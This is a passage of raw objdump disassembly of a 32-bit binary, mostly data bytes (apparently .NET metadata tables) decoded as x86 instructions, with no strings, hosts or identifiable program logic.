  4068a8:	01 00                	add    %eax,(%eax)
  4068aa:	63 17                	arpl   %edx,(%edi)
  4068ac:	00 00                	add    %al,(%eax)
  4068ae:	01 00                	add    %eax,(%eax)
  4068b0:	8c 0a                	mov    %cs,(%edx)
  4068b2:	00 00                	add    %al,(%eax)
  4068b4:	01 00                	add    %eax,(%eax)
  4068b6:	8c 0a                	mov    %cs,(%edx)
  4068b8:	00 00                	add    %al,(%eax)
  4068ba:	01 00                	add    %eax,(%eax)
  4068bc:	8c 0a                	mov    %cs,(%edx)
  4068be:	00 00                	add    %al,(%eax)
  4068c0:	01 00                	add    %eax,(%eax)
  4068c2:	98                   	cwtl
  4068c3:	1c 00                	sbb    $0x0,%al
  4068c5:	00 02                	add    %al,(%edx)
  4068c7:	00 8c 0a 00 00 01 00 	add    %cl,0x10000(%edx,%ecx,1)
  4068ce:	98                   	cwtl
  4068cf:	1c 00                	sbb    $0x0,%al
  4068d1:	00 02                	add    %al,(%edx)
  4068d3:	00 8c 0a 00 00 01 00 	add    %cl,0x10000(%edx,%ecx,1)
  4068da:	dd 06                	fldl   (%esi)
  4068dc:	00 00                	add    %al,(%eax)
  4068de:	01 00                	add    %eax,(%eax)
  4068e0:	dd 06                	fldl   (%esi)
  4068e2:	00 00                	add    %al,(%eax)
  4068e4:	01 00                	add    %eax,(%eax)
  4068e6:	0e                   	push   %cs
  4068e7:	0d 00 00 01 00       	or     $0x10000,%eax
  4068ec:	8c 0a                	mov    %cs,(%edx)
  4068ee:	00 00                	add    %al,(%eax)
  4068f0:	01 00                	add    %eax,(%eax)
  4068f2:	07                   	pop    %es
  4068f3:	0e                   	push   %cs
  4068f4:	00 00                	add    %al,(%eax)
  4068f6:	01 00                	add    %eax,(%eax)
  4068f8:	0c 0e                	or     $0xe,%al
  4068fa:	00 00                	add    %al,(%eax)
  4068fc:	01 00                	add    %eax,(%eax)
  4068fe:	0c 0e                	or     $0xe,%al
  406900:	00 00                	add    %al,(%eax)
  406902:	01 00                	add    %eax,(%eax)
  406904:	72 16                	jb     0x40691c
  406906:	00 00                	add    %al,(%eax)
  406908:	01 00                	add    %eax,(%eax)
  40690a:	dd 06                	fldl   (%esi)
  40690c:	00 00                	add    %al,(%eax)
  40690e:	01 00                	add    %eax,(%eax)
  406910:	63 17                	arpl   %edx,(%edi)
  406912:	00 00                	add    %al,(%eax)
  406914:	01 00                	add    %eax,(%eax)
  406916:	63 17                	arpl   %edx,(%edi)
  406918:	00 00                	add    %al,(%eax)
  40691a:	01 00                	add    %eax,(%eax)
  40691c:	8c 0a                	mov    %cs,(%edx)
  40691e:	00 00                	add    %al,(%eax)
  406920:	01 00                	add    %eax,(%eax)
  406922:	8c 0a                	mov    %cs,(%edx)
  406924:	00 00                	add    %al,(%eax)
  406926:	01 00                	add    %eax,(%eax)
  406928:	8c 0a                	mov    %cs,(%edx)
  40692a:	00 00                	add    %al,(%eax)
  40692c:	01 00                	add    %eax,(%eax)
  40692e:	63 17                	arpl   %edx,(%edi)
  406930:	00 00                	add    %al,(%eax)
  406932:	02 00                	add    (%eax),%al
  406934:	24 10                	and    $0x10,%al
  406936:	00 00                	add    %al,(%eax)
  406938:	01 00                	add    %eax,(%eax)
  40693a:	63 17                	arpl   %edx,(%edi)
  40693c:	00 00                	add    %al,(%eax)
  40693e:	01 00                	add    %eax,(%eax)
  406940:	35 0b 00 00 02       	xor    $0x200000b,%eax
  406945:	00 63 17             	add    %ah,0x17(%ebx)
  406948:	00 00                	add    %al,(%eax)
  40694a:	01 00                	add    %eax,(%eax)
  40694c:	63 17                	arpl   %edx,(%edi)
  40694e:	00 00                	add    %al,(%eax)
  406950:	01 00                	add    %eax,(%eax)
  406952:	63 17                	arpl   %edx,(%edi)
  406954:	00 00                	add    %al,(%eax)
  406956:	02 00                	add    (%eax),%al
  406958:	16                   	push   %ss
  406959:	0e                   	push   %cs
  40695a:	00 00                	add    %al,(%eax)
  40695c:	01 00                	add    %eax,(%eax)
  40695e:	63 17                	arpl   %edx,(%edi)
  406960:	00 00                	add    %al,(%eax)
  406962:	02 00                	add    (%eax),%al
  406964:	69 16 00 00 01 00    	imul   $0x10000,(%esi),%edx
  40696a:	63 17                	arpl   %edx,(%edi)
  40696c:	00 00                	add    %al,(%eax)
  40696e:	02 00                	add    (%eax),%al
  406970:	0c 0e                	or     $0xe,%al
  406972:	00 00                	add    %al,(%eax)
  406974:	01 00                	add    %eax,(%eax)
  406976:	63 17                	arpl   %edx,(%edi)
  406978:	00 00                	add    %al,(%eax)
  40697a:	02 00                	add    (%eax),%al
  40697c:	0c 0e                	or     $0xe,%al
  40697e:	00 00                	add    %al,(%eax)
  406980:	01 00                	add    %eax,(%eax)
  406982:	63 17                	arpl   %edx,(%edi)
  406984:	00 00                	add    %al,(%eax)
  406986:	02 00                	add    (%eax),%al
  406988:	07                   	pop    %es
  406989:	0e                   	push   %cs
  40698a:	00 00                	add    %al,(%eax)
  40698c:	01 00                	add    %eax,(%eax)
  40698e:	63 17                	arpl   %edx,(%edi)
  406990:	00 00                	add    %al,(%eax)
  406992:	02 00                	add    (%eax),%al
  406994:	11 0e                	adc    %ecx,(%esi)
  406996:	00 00                	add    %al,(%eax)
  406998:	01 00                	add    %eax,(%eax)
  40699a:	63 17                	arpl   %edx,(%edi)
  40699c:	00 00                	add    %al,(%eax)
  40699e:	02 00                	add    (%eax),%al
  4069a0:	11 0e                	adc    %ecx,(%esi)
  4069a2:	00 00                	add    %al,(%eax)
  4069a4:	01 00                	add    %eax,(%eax)
  4069a6:	e6 06                	out    %al,$0x6
  4069a8:	00 00                	add    %al,(%eax)
  4069aa:	01 00                	add    %eax,(%eax)
  4069ac:	e4 17                	in     $0x17,%al
  4069ae:	00 00                	add    %al,(%eax)
  4069b0:	02 00                	add    (%eax),%al
  4069b2:	e8 1a 00 00 01       	call   0x14069d1
  4069b7:	00 0a                	add    %cl,(%edx)
  4069b9:	18 00                	sbb    %al,(%eax)
  4069bb:	00 01                	add    %al,(%ecx)
  4069bd:	00 cc                	add    %cl,%ah
  4069bf:	0c 00                	or     $0x0,%al
  4069c1:	00 01                	add    %al,(%ecx)
  4069c3:	00 8e 18 00 00 01    	add    %cl,0x1000018(%esi)
  4069c9:	00 a2 16 00 00 01    	add    %ah,0x1000016(%edx)
  4069cf:	00 ea                	add    %ch,%dl
  4069d1:	12 00                	adc    (%eax),%al
  4069d3:	00 02                	add    %al,(%edx)
  4069d5:	00 2b                	add    %ch,(%ebx)
  4069d7:	0b 00                	or     (%eax),%eax
  4069d9:	00 01                	add    %al,(%ecx)
  4069db:	00 35 00 00 00 02    	add    %dh,0x2000000
  4069e1:	00 9b 00 00 00 03    	add    %bl,0x3000000(%ebx)
  4069e7:	00 9e 00 00 00 01    	add    %bl,0x1000000(%esi)
  4069ed:	00 5e 07             	add    %bl,0x7(%esi)
  4069f0:	00 00                	add    %al,(%eax)
  4069f2:	02 00                	add    (%eax),%al
  4069f4:	8c 0a                	mov    %cs,(%edx)
  4069f6:	00 00                	add    %al,(%eax)
  4069f8:	01 00                	add    %eax,(%eax)
  4069fa:	8c 0a                	mov    %cs,(%edx)
  4069fc:	00 00                	add    %al,(%eax)
  4069fe:	01 00                	add    %eax,(%eax)
  406a00:	5e                   	pop    %esi
  406a01:	07                   	pop    %es
  406a02:	00 00                	add    %al,(%eax)
  406a04:	01 00                	add    %eax,(%eax)
  406a06:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406a07:	02 00                	add    (%eax),%al
  406a09:	00 01                	add    %al,(%ecx)
  406a0b:	00 c1                	add    %al,%cl
  406a0d:	0d 00 00 01 00       	or     $0x10000,%eax
  406a12:	e5 1b                	in     $0x1b,%eax
  406a14:	00 00                	add    %al,(%eax)
  406a16:	01 00                	add    %eax,(%eax)
  406a18:	81 1c 00 00 01 00 7c 	sbbl   $0x7c000100,(%eax,%eax,1)
  406a1f:	1b 00                	sbb    (%eax),%eax
  406a21:	00 01                	add    %al,(%ecx)
  406a23:	00 7c 1b 00          	add    %bh,0x0(%ebx,%ebx,1)
  406a27:	00 01                	add    %al,(%ecx)
  406a29:	00 7c 1b 00          	add    %bh,0x0(%ebx,%ebx,1)
  406a2d:	00 01                	add    %al,(%ecx)
  406a2f:	00 7c 1b 00          	add    %bh,0x0(%ebx,%ebx,1)
  406a33:	00 01                	add    %al,(%ecx)
  406a35:	00 32                	add    %dh,(%edx)
  406a37:	00 00                	add    %al,(%eax)
  406a39:	00 02                	add    %al,(%edx)
  406a3b:	00 87 00 00 00 01    	add    %al,0x1000000(%edi)
  406a41:	00 7c 1b 00          	add    %bh,0x0(%ebx,%ebx,1)
  406a45:	00 01                	add    %al,(%ecx)
  406a47:	00 7c 1b 00          	add    %bh,0x0(%ebx,%ebx,1)
  406a4b:	00 01                	add    %al,(%ecx)
  406a4d:	00 7c 1b 00          	add    %bh,0x0(%ebx,%ebx,1)
  406a51:	00 01                	add    %al,(%ecx)
  406a53:	00 7c 1b 06          	add    %bh,0x6(%ebx,%ebx,1)
  406a57:	00 81 00 08 00 8d    	add    %al,-0x72fff800(%ecx)
  406a5d:	00 09                	add    %cl,(%ecx)
  406a5f:	00 a8 14 01 00 11    	add    %ch,0x11000114(%eax)
  406a65:	00 a8 14 06 00 19    	add    %ch,0x19000614(%eax)
  406a6b:	00 a8 14 0a 00 29    	add    %ch,0x29000a14(%eax)
  406a71:	00 a8 14 10 00 31    	add    %ch,0x31001014(%eax)
  406a77:	00 a8 14 10 00 39    	add    %ch,0x39001014(%eax)
  406a7d:	00 a8 14 10 00 41    	add    %ch,0x41001014(%eax)
  406a83:	00 a8 14 10 00 49    	add    %ch,0x49001014(%eax)
  406a89:	00 a8 14 10 00 51    	add    %ch,0x51001014(%eax)
  406a8f:	00 a8 14 10 00 59    	add    %ch,0x59001014(%eax)
  406a95:	00 a8 14 10 00 61    	add    %ch,0x61001014(%eax)
  406a9b:	00 a8 14 15 00 69    	add    %ch,0x69001514(%eax)
  406aa1:	00 a8 14 10 00 71    	add    %ch,0x71001014(%eax)
  406aa7:	00 a8 14 10 00 91    	add    %ch,-0x6effefec(%eax)
  406aad:	00 a8 14 06 00 01    	add    %ch,0x1000614(%eax)
  406ab3:	01 b6 1a 1a 00 01    	add    %esi,0x1001a1a(%esi)
  406ab9:	01 a1 1b 1e 00 01    	add    %esp,0x1001e1b(%ecx)
  406abf:	01 83 19 06 00 11    	add    %eax,0x11000619(%ebx)
  406ac5:	01 a8 14 10 00 19    	add    %ebp,0x19001014(%eax)
  406acb:	01 90 14 22 00 01    	add    %edx,0x1002214(%eax)
  406ad1:	02 22                	add    (%edx),%ah
  406ad3:	12 2c 00             	adc    (%eax,%eax,1),%ch
  406ad6:	09 02                	or     %eax,(%edx)
  406ad8:	6e                   	outsb  %ds:(%esi),(%dx)
  406ad9:	00 31                	add    %dh,(%ecx)
  406adb:	00 11                	add    %dl,(%ecx)
  406add:	02 ab 19 2c 00 09    	add    0x9002c19(%ebx),%ch
  406ae3:	02 05 10 36 00 19    	add    0x19003610,%al
  406ae9:	02 a8 14 06 00 19    	add    0x19000614(%eax),%ch
  406aef:	02 a5 1b 3b 00 79    	add    0x79003b1b(%ebp),%ah
  406af5:	00 a8 14 06 00 21    	add    %ch,0x21000614(%eax)
  406afb:	02 37                	add    (%edi),%dh
  406afd:	01 45 00             	add    %eax,0x0(%ebp)
  406b00:	09 02                	or     %eax,(%edx)
  406b02:	e4 0b                	in     $0xb,%al
  406b04:	4b                   	dec    %ebx
  406b05:	00 21                	add    %ah,(%ecx)
  406b07:	02 73 0c             	add    0xc(%ebx),%dh
  406b0a:	51                   	push   %ecx
  406b0b:	00 81 00 a8 14 57    	add    %al,0x5714a800(%ecx)
  406b11:	00 81 00 6a 1c 5d    	add    %al,0x5d1c6a00(%ecx)
  406b17:	00 29                	add    %ch,(%ecx)
  406b19:	02 35 1c 63 00 21    	add    0x2100631c,%dh
  406b1f:	02 56 16             	add    0x16(%esi),%dl
  406b22:	69 00 41 02 d3 01    	imul   $0x1d30241,(%eax),%eax
  406b28:	6f                   	outsl  %ds:(%esi),(%dx)
  406b29:	00 39                	add    %bh,(%ecx)
  406b2b:	02 de                	add    %dh,%bl
  406b2d:	0c 74                	or     $0x74,%al
  406b2f:	00 99 00 a8 14 8e    	add    %bl,-0x71eb5800(%ecx)
  406b35:	00 99 00 0b 0b 01    	add    %bl,0x10b0b00(%ecx)
  406b3b:	00 99 00 f8 0a 01    	add    %bl,0x10af800(%ecx)
  406b41:	00 61 02             	add    %ah,0x2(%ecx)
  406b44:	0f 1d 9b 00 61 02 9f 	nopl   -0x60fd9f00(%ebx)
  406b4b:	19 a1 00 19 02 a5    	sbb    %esp,-0x5afde700(%ecx)
  406b51:	1b a8 00 71 02 93    	sbb    -0x6cfd8f00(%eax),%ebp
  406b57:	15 ad 00 99 00       	adc    $0x9900ad,%eax
  406b5c:	06                   	push   %es
  406b5d:	19 b4 00 99 00 31 03 	sbb    %esi,0x3310099(%eax,%eax,1)
  406b64:	1e                   	push   %ds
  406b65:	00 99 00 06 19 bb    	add    %bl,-0x44e6fa00(%ecx)
  406b6b:	00 b9 00 a8 14 06    	add    %bh,0x614a800(%ecx)
  406b71:	00 c1                	add    %al,%cl
  406b73:	00 a8 14 c1 00 b9    	add    %ch,-0x46ff3eec(%eax)
  406b79:	00 0d 17 c7 00 b9    	add    %cl,0xb900c717
  406b7f:	00 0f                	add    %cl,(%edi)
  406b81:	0c ce                	or     $0xce,%al
  406b83:	00 61 02             	add    %ah,0x2(%ecx)
  406b86:	9f                   	lahf
  406b87:	19 d3                	sbb    %edx,%ebx
  406b89:	00 89 02 2f 08 06    	add    %cl,0x6082f02(%ecx)
  406b8f:	00 91 02 a8 14 dd    	add    %dl,-0x22eb57fe(%ecx)
  406b95:	00 99 02 a8 14 e4    	add    %bl,-0x1beb57fe(%ecx)
  406b9b:	00 a1 00 a8 14 ea    	add    %ah,-0x15eb5800(%ecx)
  406ba1:	00 99 00 fa 1a f5    	add    %bl,-0xae50600(%ecx)
  406ba7:	00 79 00             	add    %bh,0x0(%ecx)
  406baa:	2a 0c fb             	sub    (%ebx,%edi,8),%cl
  406bad:	00 a1 00 36 1a ff    	add    %ah,-0xe5ca00(%ecx)
  406bb3:	00 c1                	add    %al,%cl
  406bb5:	02 a8 14 e4 00 a9    	add    -0x56ff1bec(%eax),%ch
  406bbb:	00 a8 14 0b 01 c9    	add    %ch,-0x36fef4ec(%eax)
  406bc1:	02 a8 14 e4 00 29    	add    0x2900e414(%eax),%ch
  406bc7:	01 04 03             	add    %eax,(%ebx,%eax,1)
  406bca:	15 01 d1 02 50       	adc    $0x5002d101,%eax
  406bcf:	07                   	pop    %es
  406bd0:	22 01                	and    (%ecx),%al
  406bd2:	c9                   	leave
  406bd3:	00 1d 17 29 01 a9    	add    %bl,0xa9012917
  406bd9:	00 2f                	add    %ch,(%edi)
  406bdb:	08 06                	or     %al,(%esi)
  406bdd:	00 29                	add    %ch,(%ecx)
  406bdf:	01 2f                	add    %ebp,(%edi)
  406be1:	08 06                	or     %al,(%esi)
  406be3:	00 99 00 2f 08 06    	add    %bl,0x6082f00(%ecx)
  406be9:	00 29                	add    %ch,(%ecx)
  406beb:	01 fc                	add    %edi,%esp
  406bed:	02 34 01             	add    (%ecx,%eax,1),%dh
  406bf0:	e1 02                	loope  0x406bf4
  406bf2:	6e                   	outsb  %ds:(%esi),(%dx)
  406bf3:	00 3a                	add    %bh,(%edx)
  406bf5:	01 29                	add    %ebp,(%ecx)
  406bf7:	01 09                	add    %ecx,(%ecx)
  406bf9:	03 41 01             	add    0x1(%ecx),%eax
  406bfc:	e9 02 a8 14 e4       	jmp    0xe4551403
  406c01:	00 01                	add    %al,(%ecx)
  406c03:	02 a8 14 49 01 01    	add    0x1014914(%eax),%ch
  406c09:	02 59 1b             	add    0x1b(%ecx),%bl
  406c0c:	50                   	push   %eax
  406c0d:	01 f1                	add    %esi,%ecx
  406c0f:	02 29                	add    (%ecx),%ch
  406c11:	14 61                	adc    $0x61,%al
  406c13:	01 e1                	add    %esp,%ecx
  406c15:	02 56 16             	add    0x16(%esi),%dl
  406c18:	68 01 99 00 d0       	push   $0xd0009901
  406c1d:	0e                   	push   %cs
  406c1e:	6e                   	outsb  %ds:(%esi),(%dx)
  406c1f:	01 29                	add    %ebp,(%ecx)
  406c21:	01 ad 08 76 01 e9    	add    %ebp,-0x16fe89f8(%ebp)
  406c27:	00 a8 14 57 00 29    	add    %ch,0x29005714(%eax)
  406c2d:	01 3c 11             	add    %edi,(%ecx,%edx,1)
  406c30:	7e 01                	jle    0x406c33
  406c32:	29 01                	sub    %eax,(%ecx)
  406c34:	e9 0c 06 00 f1       	jmp    0xf1407245
  406c39:	02 ab 19 83 01 61    	add    0x61018319(%ebx),%ch
  406c3f:	02 7b 18             	add    0x18(%ebx),%bh
  406c42:	88 01                	mov    %al,(%ecx)
  406c44:	01 03                	add    %eax,(%ebx)
  406c46:	fe                   	(bad)
  406c47:	18 8e 01 f9 00 a8    	sbb    %cl,-0x57ff06ff(%esi)
  406c4d:	14 06                	adc    $0x6,%al
  406c4f:	00 61 02             	add    %ah,0x2(%ecx)
  406c52:	87 18                	xchg   %ebx,(%eax)
  406c54:	9b                   	fwait
  406c55:	01 f9                	add    %edi,%ecx
  406c57:	00 a3 04 a1 01 e1    	add    %ah,-0x1efe5efc(%ebx)
  406c5d:	02 56 16             	add    0x16(%esi),%dl
  406c60:	ae                   	scas   %es:(%edi),%al
  406c61:	01 e1                	add    %esp,%ecx
  406c63:	02 56 16             	add    0x16(%esi),%dl
  406c66:	b4 01                	mov    $0x1,%ah
  406c68:	f1                   	int1
  406c69:	00 a8 14 06 00 0c    	add    %ch,0xc000614(%eax)
  406c6f:	00 65 0f             	add    %ah,0xf(%ebp)
  406c72:	c2 01 0c             	ret    $0xc01
  406c75:	00 0d 1b c8 01 61    	add    %cl,0x6101c81b
  406c7b:	02 3c 14             	add    (%esp,%edx,1),%bh
  406c7e:	fb                   	sti
  406c7f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406c82:	62 12                	bound  %edx,(%edx)
  406c84:	06                   	push   %es
  406c85:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406c88:	1f                   	pop    %ds
  406c89:	03 d1                	add    %ecx,%edx
  406c8b:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  406c8e:	90                   	nop
  406c8f:	14 e6                	adc    $0xe6,%al
  406c91:	01 14 00             	add    %edx,(%eax,%eax,1)
  406c94:	b6 1a                	mov    $0x1a,%dh
  406c96:	f8                   	clc
  406c97:	01 61 02             	add    %esp,0x2(%ecx)
  406c9a:	1d 17 fd 01 14       	sbb    $0x1401fd17,%eax
  406c9f:	00 a1 1b 1e 00 29    	add    %ah,0x29001e1b(%ecx)
  406ca5:	01 59 0a             	add    %ebx,0xa(%ecx)
  406ca8:	0a 02                	or     (%edx),%al
  406caa:	e1 02                	loope  0x406cae
  406cac:	56                   	push   %esi
  406cad:	16                   	push   %ss
  406cae:	0f 02 09             	lar    (%ecx),%ecx
  406cb1:	02 ad 00 1a 02 61    	add    0x61021a00(%ebp),%ch
  406cb7:	02 cf                	add    %bh,%cl
  406cb9:	0f fb 00             	psubq  (%eax),%mm0
  406cbc:	11 03                	adc    %eax,(%ebx)
  406cbe:	37                   	aaa
  406cbf:	08 1f                	or     %bl,(%edi)
  406cc1:	02 09                	add    (%ecx),%cl
  406cc3:	02 ad 00 24 02 09    	add    0x9022400(%ebp),%ch
  406cc9:	02 ad 00 29 02 09    	add    0x9022900(%ebp),%ch
  406ccf:	02 ad 00 2e 02 09    	add    0x9022e00(%ebp),%ch
  406cd5:	02 ce                	add    %dh,%cl
  406cd7:	00 35 02 09 03 37    	add    %dh,0x37030902
  406cdd:	08 3a                	or     %bh,(%edx)
  406cdf:	02 09                	add    (%ecx),%cl
  406ce1:	02 ce                	add    %dh,%cl
  406ce3:	00 3f                	add    %bh,(%edi)
  406ce5:	02 09                	add    (%ecx),%cl
  406ce7:	02 ce                	add    %dh,%cl
  406ce9:	00 44 02 09          	add    %al,0x9(%edx,%eax,1)
  406ced:	02 ce                	add    %dh,%cl
  406cef:	00 49 02             	add    %cl,0x2(%ecx)
  406cf2:	09 02                	or     %eax,(%edx)
  406cf4:	8e 05 50 02 19 03    	mov    0x3190250,%es
  406cfa:	37                   	aaa
  406cfb:	08 55 02             	or     %dl,0x2(%ebp)
  406cfe:	e1 02                	loope  0x406d02
  406d00:	56                   	push   %esi
  406d01:	16                   	push   %ss
  406d02:	62 02                	bound  %eax,(%edx)
  406d04:	31 01                	xor    %eax,(%ecx)
  406d06:	e6 1c                	out    %al,$0x1c
  406d08:	68 02 29 03 64       	push   $0x64032902
  406d0d:	18 36                	sbb    %dh,(%esi)
  406d0f:	00 39                	add    %bh,(%ecx)
  406d11:	01 a8 14 77 02 29    	add    %ebp,0x29027714(%eax)
  406d17:	01 24 0d 68 02 29 01 	add    %esp,0x1290268(,%ecx,1)
  406d1e:	29 08                	sub    %ecx,(%eax)
  406d20:	06                   	push   %es
  406d21:	00 39                	add    %bh,(%ecx)
  406d23:	01 a8 14 85 02 49    	add    %ebp,0x49028514(%eax)
  406d29:	03 f9                	add    %ecx,%edi
  406d2b:	1b 99 02 e9 00 a8    	sbb    -0x57ff16fe(%ecx),%ebx
  406d31:	14 06                	adc    $0x6,%al
  406d33:	00 29                	add    %ch,(%ecx)
  406d35:	01 50 0a             	add    %edx,0xa(%eax)
  406d38:	c8 01 89 00          	enter  $0x8901,$0x0
  406d3c:	a8 14                	test   $0x14,%al
  406d3e:	10 00                	adc    %al,(%eax)
  406d40:	e1 02                	loope  0x406d44
  406d42:	e0 00                	loopne 0x406d44
  406d44:	ae                   	scas   %es:(%edi),%al
  406d45:	02 e1                	add    %cl,%ah
  406d47:	02 0b                	add    (%ebx),%cl
  406d49:	06                   	push   %es
  406d4a:	b5 02                	mov    $0x2,%ch
  406d4c:	e1 02                	loope  0x406d50
  406d4e:	8e 05 bc 02 e1 02    	mov    0x2e102bc,%es
  406d54:	65 00 c3             	gs add %al,%bl
  406d57:	02 e1                	add    %cl,%ah
  406d59:	02 ad 00 ca 02 e1    	add    -0x1efd3600(%ebp),%ch
  406d5f:	02 e9                	add    %cl,%ch
  406d61:	00 d1                	add    %dl,%cl
  406d63:	02 e1                	add    %cl,%ah
  406d65:	02 ce                	add    %dh,%cl
  406d67:	00 d8                	add    %bl,%al
  406d69:	02 0c 00             	add    (%eax,%eax,1),%cl
  406d6c:	a8 14                	test   $0x14,%al
  406d6e:	06                   	push   %es
  406d6f:	00 e1                	add    %ah,%cl
  406d71:	02 56 16             	add    0x16(%esi),%dl
  406d74:	09 03                	or     %eax,(%ebx)
  406d76:	11 02                	adc    %eax,(%edx)
  406d78:	6b 15 6f 00 69 03 a7 	imul   $0xffffffa7,0x369006f,%edx
  406d7f:	07                   	pop    %es
  406d80:	88 01                	mov    %al,(%ecx)
  406d82:	49                   	dec    %ecx
  406d83:	01 a8 14 10 00 51    	add    %ebp,0x51001014(%eax)
  406d89:	01 f8                	add    %edi,%eax
  406d8b:	17                   	pop    %ss
  406d8c:	2f                   	das
  406d8d:	03 51 01             	add    0x1(%ecx),%edx
  406d90:	67 06                	addr16 push %es
  406d92:	35 03 71 03 a7       	xor    $0xa7037103,%eax
  406d97:	06                   	push   %es
  406d98:	fb                   	sti
  406d99:	00 79 03             	add    %bh,0x3(%ecx)
  406d9c:	12 07                	adc    (%edi),%al
  406d9e:	fb                   	sti
  406d9f:	00 61 02             	add    %ah,0x2(%ecx)
  406da2:	1b 1d 9b 00 51 01    	sbb    0x151009b,%ebx
  406da8:	86 15 3b 03 51 01    	xchg   %dl,0x151033b
  406dae:	cb                   	lret
  406daf:	0e                   	push   %cs
  406db0:	06                   	push   %es
  406db1:	00 51 01             	add    %dl,0x1(%ecx)
  406db4:	a8 14                	test   $0x14,%al
  406db6:	06                   	push   %es
  406db7:	00 59 01             	add    %bl,0x1(%ecx)
  406dba:	a8 14                	test   $0x14,%al
  406dbc:	06                   	push   %es
  406dbd:	00 59 01             	add    %bl,0x1(%ecx)
  406dc0:	b4 06                	mov    $0x6,%ah
  406dc2:	10 00                	adc    %al,(%eax)
  406dc4:	69 03 78 10 6f 00    	imul   $0x6f1078,(%ebx),%eax
  406dca:	61                   	popa
  406dcb:	02 7b 18             	add    0x18(%ebx),%bh
  406dce:	42                   	inc    %edx
  406dcf:	03 59 01             	add    0x1(%ecx),%ebx
  406dd2:	43                   	inc    %ebx
  406dd3:	18 10                	sbb    %dl,(%eax)
  406dd5:	00 59 01             	add    %bl,0x1(%ecx)
  406dd8:	84 06                	test   %al,(%esi)
  406dda:	48                   	dec    %eax
  406ddb:	03 59 01             	add    0x1(%ecx),%ebx
  406dde:	b8 1b 15 00 51       	mov    $0x5100151b,%eax
  406de3:	01 f3                	add    %esi,%ebx
  406de5:	11 4f 03             	adc    %ecx,0x3(%edi)
  406de8:	51                   	push   %ecx
  406de9:	01 59 1b             	add    %ebx,0x1b(%ecx)
  406dec:	1e                   	push   %ds
  406ded:	00 89 03 05 14 56    	add    %cl,0x56140503(%ecx)
  406df3:	03 91 03 3d 08 6f    	add    0x6f083d03(%ecx),%edx
  406df9:	00 61 01             	add    %ah,0x1(%ecx)
  406dfc:	5f                   	pop    %edi
  406dfd:	1c 5b                	sbb    $0x5b,%al
  406dff:	03 61 02             	add    0x2(%ecx),%esp
  406e02:	7b 18                	jnp    0x406e1c
  406e04:	65 03 61 01          	add    %gs:0x1(%ecx),%esp
  406e08:	83 0a 6c             	orl    $0x6c,(%edx)
  406e0b:	03 29                	add    (%ecx),%ebp
  406e0d:	03 9d 08 72 03 29    	add    0x29037208(%ebp),%ebx
  406e13:	03 09                	add    (%ecx),%ecx
  406e15:	16                   	push   %ss
  406e16:	4b                   	dec    %ebx
  406e17:	00 19                	add    %bl,(%ecx)
  406e19:	02 5f 16             	add    0x16(%edi),%bl
  406e1c:	57                   	push   %edi
  406e1d:	00 69 03             	add    %ch,0x3(%ecx)
  406e20:	c1 06 77             	roll   $0x77,(%esi)
  406e23:	03 69 01             	add    0x1(%ecx),%ebp
  406e26:	a8 14                	test   $0x14,%al
  406e28:	10 00                	adc    %al,(%eax)
  406e2a:	a1 03 9d 07 10       	mov    0x10079d03,%eax
  406e2f:	00 69 03             	add    %ch,0x3(%ecx)
  406e32:	02 0d 77 03 69 03    	add    0x3690377,%cl
  406e38:	d1 06                	roll   $1,(%esi)
  406e3a:	6f                   	outsl  %ds:(%esi),(%dx)
  406e3b:	00 59 01             	add    %bl,0x1(%ecx)
  406e3e:	ac                   	lods   %ds:(%esi),%al
  406e3f:	0c 15                	or     $0x15,%al
  406e41:	00 59 01             	add    %bl,0x1(%ecx)
  406e44:	3c 0a                	cmp    $0xa,%al
  406e46:	15 00 51 01 59       	adc    $0x59015100,%eax
  406e4b:	1b 7b 03             	sbb    0x3(%ebx),%edi
  406e4e:	11 02                	adc    %eax,(%edx)
  406e50:	6c                   	insb   (%dx),%es:(%edi)
  406e51:	1b 72 03             	sbb    0x3(%edx),%esi
  406e54:	11 02                	adc    %eax,(%edx)
  406e56:	ef                   	out    %eax,(%dx)
  406e57:	1c 77                	sbb    $0x77,%al
  406e59:	03 69 03             	add    0x3(%ecx),%ebp
  406e5c:	2a 1b                	sub    (%ebx),%bl
  406e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  406e5f:	00 a9 03 a8 14 10    	add    %ch,0x1014a803(%ecx)
  406e65:	00 a9 03 cc 0a 68    	add    %ch,0x680acc03(%ecx)
  406e6b:	02 b1 03 a8 14 06    	add    0x614a803(%ecx),%dh
  406e71:	00 b1 03 03 07 fb    	add    %dh,-0x4f8fcfd(%ecx)
  406e77:	00 61 02             	add    %ah,0x2(%ecx)
  406e7a:	6a 17                	push   $0x17
  406e7c:	fd                   	std
  406e7d:	01 71 01             	add    %esi,0x1(%ecx)
  406e80:	a8 14                	test   $0x14,%al
  406e82:	10 00                	adc    %al,(%eax)
  406e84:	71 01                	jno    0x406e87
  406e86:	18 19                	sbb    %bl,(%ecx)
  406e88:	9a 03 79 01 90 14 a0 	lcall  $0xa014,$0x90017903
  406e8f:	03 81 01 b6 1a a6    	add    -0x59e549ff(%ecx),%eax
  406e95:	03 89 01 65 0f ac    	add    -0x53f09aff(%ecx),%ecx
  406e9b:	03 61 02             	add    0x2(%ecx),%esp
  406e9e:	d2 19                	rcrb   %cl,(%ecx)
  406ea0:	fb                   	sti
  406ea1:	00 81 01 a1 1b 1e    	add    %al,0x1e1ba101(%ecx)
  406ea7:	00 51 01             	add    %dl,0x1(%ecx)
  406eaa:	a2 05 b6 03 b9       	mov    %al,0xb903b605
  406eaf:	03 6e 00             	add    0x0(%esi),%ebp
  406eb2:	c8 01 51 01          	enter  $0x5101,$0x1
  406eb6:	f5                   	cmc
  406eb7:	02 c8                	add    %al,%cl
  406eb9:	01 c1                	add    %eax,%ecx
  406ebb:	03 2a                	add    (%edx),%ebp
  406ebd:	0c fb                	or     $0xfb,%al
  406ebf:	00 c9                	add    %cl,%cl
  406ec1:	03 67 1b             	add    0x1b(%edi),%esp
  406ec4:	d6                   	salc
  406ec5:	03 c9                	add    %ecx,%ecx
  406ec7:	03 b5 19 ea 03 11    	add    0x1103ea19(%ebp),%esi
  406ecd:	02 17                	add    (%edi),%dl
  406ecf:	1b fb                	sbb    %ebx,%edi
  406ed1:	03 11                	add    (%ecx),%edx
  406ed3:	02 31                	add    (%ecx),%dh
  406ed5:	07                   	pop    %es
  406ed6:	77 03                	ja     0x406edb
  406ed8:	11 02                	adc    %eax,(%edx)
  406eda:	f3 06                	repz push %es
